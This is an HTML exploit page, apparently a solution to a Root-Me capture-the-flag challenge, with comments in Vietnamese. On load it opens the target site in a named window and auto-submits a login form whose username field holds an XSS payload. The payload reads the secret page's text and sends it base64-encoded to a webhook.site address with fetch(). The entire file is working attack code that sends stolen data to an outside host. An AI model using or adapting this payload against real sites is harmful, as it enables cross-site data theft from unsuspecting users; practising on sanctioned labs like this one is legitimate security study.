<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. Mở trang chủ (nơi chứa secret) và đặt tên cửa sổ
        var win = window.open("http://challenge01.root-me.org:58003/", "secret_vault");

        setTimeout(() => {
            // 2. Tự động POST XSS
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://challenge01.root-me.org:58003/login';
            form.target = "_blank"; 

            const input = document.createElement('input');
            input.name = 'username';
            
            // Payload viết trên một dòng duy nhất để tránh lỗi Syntax do xuống dòng
            // Sử dụng window.name để định danh thay vì gọi window.open lần nữa
            input.value = `<script>try{var s=window.open('','secret_vault').document.body.innerText;fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?d='+btoa(s))}catch(e){fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?e='+btoa(e.message))}<\/script>`;

            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }, 2000);
    </script>
</body>
</html>
